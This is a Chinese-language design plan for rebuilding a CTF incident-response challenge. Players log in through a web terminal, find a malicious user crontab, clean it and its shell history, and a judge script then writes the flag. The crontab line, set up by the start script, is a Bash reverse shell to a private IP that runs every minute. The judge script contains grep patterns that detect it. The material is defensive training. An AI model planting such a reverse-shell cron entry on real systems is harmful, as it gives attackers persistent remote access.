# 服务后门排查复现方案

## 一、复现目标

本题的复现目标不是简单搭一个能登录的 Linux 容器，而是要完整还原 **“普通用户被植入恶意定时任务、处置完成后由裁判自动放旗”** 的训练场景。只有把恶意计划任务、命令历史、Web 终端入口和判题机制一起复刻出来，才能真正保留这道题的训练价值。

换言之，后续环境制作时至少应同时满足以下几点：选手能够通过浏览器进入 ttyd 终端；系统中存在可被 `ctf` 用户观察和清理的恶意 crontab；清理动作完成后不会直接提权，而是由后台判题脚本生成 `/flag`；整个过程尽量贴近真实应急处置流程，而不是把题目做成单纯的命令回显题。

## 二、建议环境架构

从真实解法来看，本题完全可以采用 **单容器结构** 实现，不需要多机联动。核心组件建议如下。

| 组件 | 作用 | 建议实现 |
| --- | --- | --- |
| Linux 基础镜像 | 提供目标主机环境 | Alpine 或 Ubuntu 容器 |
| ttyd | 提供 Web 终端入口 | 启动 `login` 或受控 shell |
| `ctf` 用户 | 选手登录账号 | 用户名密码均设为 `ctf` |
| 用户级 crontab | 恶意持久化落点 | 为 `ctf` 用户预置计划任务 |
| `.ash_history` | 痕迹文件 | 用于模拟命令残留与清痕要求 |
| 判题脚本 | 周期检查环境状态 | 条件满足后写出 `/flag` |
| `/readflag` | 干扰项 | 设置为普通用户不可直接调用 |

这种设计的优点在于，所有关键线索都集中在单机内部，排查路径清晰，同时又保留了足够真实的系统取证体验。

## 三、初始环境设计

为了让题目既容易上手又具备训练意义，建议把初始状态设置为“攻击者已经成功植入定时任务后门，但尚未进一步复杂化环境”。这样既能引导选手快速聚焦 `crontab`，也能保留一定的判题与处置思考空间。

### 3.1 用户与登录入口

建议创建普通用户 `ctf`，密码同样设置为 `ctf`，并把 ttyd 直接对接到系统登录流程。这样选手进入环境后的第一感受就与原题一致，即通过浏览器访问终端、输入 `ctf/ctf` 进行登录。

### 3.2 关键文件布局

推荐的关键文件与目录如下。

| 路径 | 初始状态 | 设计目的 |
| --- | --- | --- |
| `/etc/crontabs/ctf` 或用户 crontab | 含恶意反连任务 | 作为主要异常点 |
| `/home/ctf/.ash_history` | 初始存在且可写 | 作为痕迹清理对象 |
| `/readflag` | 仅 root 可执行 | 作为干扰项，防止选手误以为必须提权 |
| `/flag` | 初始不存在 | 由判题脚本动态生成 |
| `/root/check/judge.sh` 或 `judge.py` | 周期运行 | 检查修复状态并写出 `/flag` |

### 3.3 恶意计划任务设计

本题最核心的恶意内容就是用户级计划任务。建议直接写入如下语句：

```text
* * * * * /bin/bash -i >& /dev/tcp/192.168.0.1/9999 0>&1
```

这条命令有几个优点。第一，它的恶意特征非常鲜明，利于教学。第二，它属于典型的 Bash 反弹 Shell 语句，具有现实攻击场景映射。第三，它执行周期为每分钟一次，既足以体现持续性，又不会在复现环境里造成过高负载。

如果使用 Alpine / BusyBox 体系，可以直接把该行写入 `/etc/crontabs/ctf`；如果使用 Ubuntu，也可以通过 `crontab -u ctf` 的方式预置到用户计划任务中。无论采用哪种发行版，都应保证选手登录后通过 `crontab -l` 能直接观察到异常任务。

## 四、判题逻辑设计

本题的判题逻辑建议采用 **状态判定型**，而不是命令回显型。也就是说，裁判不关心选手具体输入了哪些命令，而是只关心环境是否已经恢复到目标状态。

推荐的检查条件如下。

| 检查项 | 判定标准 |
| --- | --- |
| 当前用户 crontab | 不再包含 `/dev/tcp/192.168.0.1/9999` |
| 恶意计划任务 | 为空，或至少恶意项已消失 |
| 历史文件 | `.ash_history` 被清空、删除，或重定向到 `/dev/null` |
| `/flag` | 满足上述条件后由裁判自动生成 |

一个可直接落地的示意性判题脚本如下。

```bash
#!/bin/sh
while true; do
  bad_cron=0
  bad_hist=0

  crontab -u ctf -l 2>/dev/null | grep -q '/dev/tcp/192.168.0.1/9999' && bad_cron=1

  if [ -f /home/ctf/.ash_history ]; then
    grep -q '/dev/tcp/192.168.0.1/9999\|crontab' /home/ctf/.ash_history 2>/dev/null && bad_hist=1
  fi

  if [ "$bad_cron" -eq 0 ] && [ "$bad_hist" -eq 0 ]; then
    echo 'xctf{REPLACE_WITH_REAL_FLAG}' > /flag
    chmod 777 /flag
    break
  fi

  sleep 10
done
```

如果希望进一步贴近本次真实解法，还可以把 `.ash_history -> /dev/null` 也视为合法处置结果，而不是强制要求历史文件必须删除。这样更符合选手在真实环境中采取的“最小改动 + 防止继续写入”思路。

## 五、启动逻辑设计

建议使用统一启动脚本 `start.sh` 负责完成用户初始化、恶意计划任务部署、判题脚本启动和 ttyd 拉起。推荐的职责划分如下。

| 启动项 | 作用 |
| --- | --- |
| 创建 `ctf` 用户并设置密码 | 提供登录能力 |
| 初始化 `.ash_history` | 保证痕迹文件存在 |
| 写入恶意 crontab | 形成题目主要异常点 |
| 启动 `crond` | 让计划任务真正生效 |
| 启动判题脚本 | 轮询修复状态 |
| 启动 ttyd | 向外暴露浏览器终端 |

示意性启动脚本可以写成：

```bash
#!/bin/sh
set -e

if ! id ctf >/dev/null 2>&1; then
  adduser -D ctf
  echo 'ctf:ctf' | chpasswd
fi

mkdir -p /root/check
printf '* * * * * /bin/bash -i >& /dev/tcp/192.168.0.1/9999 0>&1\n' > /etc/crontabs/ctf
chown ctf:ctf /home/ctf/.ash_history 2>/dev/null || true
chmod 600 /home/ctf/.ash_history 2>/dev/null || true
chmod 700 /readflag
chmod 600 /etc/crontabs/root 2>/dev/null || true

crond
/root/check/judge.sh &
/usr/sbin/ttyd -p 18080 login
```

如果使用 Ubuntu 体系，则把 `crond`、用户创建方式和 cron 文件路径替换为对应发行版命令即可，整体结构不需要改变。

## 六、参赛者预期解法

从训练设计角度看，参赛者的标准解法应当非常清晰：先登录 ttyd 终端；随后根据题面中的“定时任务”提示查看 `crontab -l`；识别出 `/dev/tcp/192.168.0.1/9999` 为恶意 Bash 反连；接着清空用户 crontab，并适度处理 `.ash_history` 等命令痕迹；最后等待裁判脚本生成 `/flag` 并读取结果。

这种解法路径非常适合用于 **Linux 计划任务后门排查入门训练**。因为它强调的是异常识别、最小修复和状态验证，而不是漏洞利用技巧本身。

## 七、建议的目录组织

如果后续要把该题真正补造成可运行复现环境，建议在仓库中采用如下结构。

| 路径 | 内容 |
| --- | --- |
| `服务后门排查/Dockerfile` | 基础镜像、依赖安装、用户初始化 |
| `服务后门排查/start.sh` | 启动 cron、判题脚本与 ttyd |
| `服务后门排查/judge.sh` | 检查修复状态并生成 `/flag` |
| `服务后门排查/init/ctf.cron` | 含恶意计划任务的初始模板 |
| `服务后门排查/init/readflag` | 干扰项二进制或占位脚本 |
| `服务后门排查/README.md` | 题目说明、账号信息和触发规则 |

## 八、落地复现时的注意事项

本题在制作时有三个地方尤其需要注意。第一，恶意计划任务必须确保在选手登录后能够通过 `crontab -l` 明确观察到，否则题面提示与排查路径会脱节。第二，判题逻辑不应要求选手真正提权，因为原题的价值就在于“清理后门即可放旗”，而不是变成另一道提权题。第三，历史文件的检查应适度宽松，最好允许“清空、删除、重定向到 `/dev/null`”等多种修复结果，避免把题目做成对命令细节过度敏感的脆弱环境。

归根结底，这道题最值得保留的并不是某一行 crontab 本身，而是 **题面提示、恶意计划任务、痕迹文件、异步裁判放旗** 共同组成的闭环。只要这个闭环被正确复现，这道题就能很好地训练选手的 Linux 服务后门排查能力。
